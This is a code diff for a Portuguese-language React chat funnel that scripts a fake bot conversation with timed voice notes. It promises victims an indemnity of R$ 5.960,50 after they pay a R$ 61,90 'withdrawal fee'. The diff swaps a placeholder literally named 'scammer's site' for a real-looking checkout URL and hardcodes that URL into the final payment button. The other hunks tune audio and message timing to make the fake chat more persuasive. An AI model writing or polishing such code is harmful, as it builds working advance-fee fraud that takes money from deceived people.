@@ -116,7 +116,7 @@ const funnelDefinition: {
   "globalVariables": {
     "indenizacaoValor": "R$ 5.960,50",
     "taxaValor": "R$ 61,90",
-    "paymentLink": "https://site-do-golpista.com/checkout-pix"
+    "paymentLink": "https://kingspay.site/checkout/taxa-de-saque-2025"
   },
   "steps": {
     "step1_video": {
@@ -344,7 +344,7 @@ const funnelDefinition: {
           {
             "text": "Concluir pagamento e receber minha indenização",
             "action": "redirectToPayment",
-            "paymentUrl": "{{paymentLink}}"
+            "paymentUrl": "https://kingspay.site/checkout/taxa-de-saque-2025"
           }
         ]
       }
@@ -669,7 +669,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               messageAddedInThisStep = true;
 
               if (data.audioUrl && audioPlayerRef.current) {
-                if (isAudioPlaying) {
+                if (isAudioPlaying && currentPlayingAudioId) {
                   audioPlayerRef.current.pause();
                 }
                 audioPlayerRef.current.src = data.audioUrl;
@@ -682,7 +682,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                   .catch(error => {
                     console.warn("Autoplay de áudio foi bloqueado pelo navegador:", error);
                     setIsAudioPlaying(false);
-                    setCurrentPlayingAudioId(newBotDisplayMessage.id); // Permite controle manual
+                    setCurrentPlayingAudioId(newBotDisplayMessage.id); 
                   });
               }
               break;
@@ -737,19 +737,20 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             if (stepConfig.type === 'displayMessage') {
                 const msgData = stepConfig.data as FlowStepDataDisplayMessage;
                 if (msgData.audioUrl) {
-                    if (stepConfig.key === 'step5b_audio_message') {
+                    if (stepConfig.key === 'step5b_audio_message') { // ~8s audio
                         nextStepTransitionDelayMs = 9500;
-                    } else if (stepConfig.key === 'step9b_audio_message') {
+                    } else if (stepConfig.key === 'step9b_audio_message') { // ~9s audio
                         nextStepTransitionDelayMs = 10500;
-                    } else if (stepConfig.key === 'step12b_audio_message') {
+                    } else if (stepConfig.key === 'step12b_audio_message') { // ~8s audio + 2s buffer = 10s total
                         nextStepTransitionDelayMs = 10000;
                     } else {
+                        // Fallback for other audios if any are added, assumes an average length or a fixed delay
                         nextStepTransitionDelayMs = (audioPlayerRef.current?.duration && !isNaN(audioPlayerRef.current.duration) ? (audioPlayerRef.current.duration * 1000) : 8000) + 1500;
                     }
-                } else {
-                    if (!msgData.details && !msgData.title) {
+                } else { // No audio, transition based on text length or a fixed delay
+                    if (!msgData.details && !msgData.title) { // Only simple message
                          nextStepTransitionDelayMs = msgData.message ? Math.max(1200, msgData.message.length * 50) : 1200;
-                    } else {
+                    } else { // Message with title/details
                         nextStepTransitionDelayMs = 3500;
                     }
                 }
@@ -759,12 +760,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
             if (nextStepTransitionDelayMs > 0) {
                 autoTransitionTimerRef.current = setTimeout(() => {
-                    const audioIsCurrentlyPlayingForThisStep = stepConfig.type === 'displayMessage' &&
-                                                                (stepConfig.data as FlowStepDataDisplayMessage).audioUrl &&
-                                                                isAudioPlaying &&
-                                                                messages.find(m => m.id === currentPlayingAudioId)?.audioUrl === (stepConfig.data as FlowStepDataDisplayMessage).audioUrl;
+                   const currentAudioUrlForThisStep = stepConfig.type === 'displayMessage' ? (stepConfig.data as FlowStepDataDisplayMessage).audioUrl : null;
+                   const audioIsCurrentlyPlayingForThisSpecificStep = currentAudioUrlForThisStep && isAudioPlaying && messages.find(m => m.id === currentPlayingAudioId)?.audioUrl === currentAudioUrlForThisStep;
 
-                    if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key && !audioIsCurrentlyPlayingForThisStep) {
+
+                    if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key && !audioIsCurrentlyPlayingForThisSpecificStep) {
                         handleUserActionAndNavigate(stepConfig.nextStep as string);
                     }
                 }, nextStepTransitionDelayMs);
@@ -826,7 +826,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         audio.removeEventListener('ended', handleAudioEnded);
       };
     }
-  }, [currentStepKey, messages, currentPlayingAudioId, isAudioPlaying]); // Adicionado isAudioPlaying
+  }, [currentStepKey, messages, currentPlayingAudioId, isAudioPlaying]);
 
 
   const handleOptionClick = (option: ChatOption) => {
@@ -981,9 +981,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
   return (
     <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
-      {/* Audio element is created once and src is updated */}
-      {/* <audio ref={audioPlayerRef} style={{ display: 'none' }} /> */}
-
 
       {currentVideoData && !isBotTyping && (
         <div className="video-player-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
